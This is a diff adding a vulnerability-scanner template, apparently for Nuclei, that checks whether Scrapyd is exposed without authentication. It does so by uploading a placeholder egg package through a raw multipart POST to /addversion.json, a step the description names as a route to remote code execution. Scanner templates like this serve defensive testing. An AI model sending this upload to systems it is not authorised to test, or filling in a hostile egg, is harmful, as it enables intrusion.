@@ -1,0 +1,39 @@
+id: scrapyd-unauthorized-access-rce
+info:
+  name: Scrapyd Unauthorized Access RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Scrapyd is a service provided by the Scrapy framework for deploying crawlers. If the service is accessible without authentication, attackers can deploy malicious packages to achieve remote code execution.
+  tags: unauthorized,rce
+http:
+  - raw:
+      - |
+        POST /addversion.json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{rand_base(16)}}
+
+        ------{{rand_base(16)}}
+        Content-Disposition: form-data; name="project"
+
+        spiderman
+        ------{{rand_base(16)}}
+        Content-Disposition: form-data; name="version"
+
+        r01
+        ------{{rand_base(16)}}
+        Content-Disposition: form-data; name="egg"; filename="spiderman.egg"
+        Content-Type: application/octet-stream
+
+        <EGG-DATA>
+        ------{{rand_base(16)}}--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status": "ok"'
+      - type: word
+        part: header
+        words:
+          - "application/json"
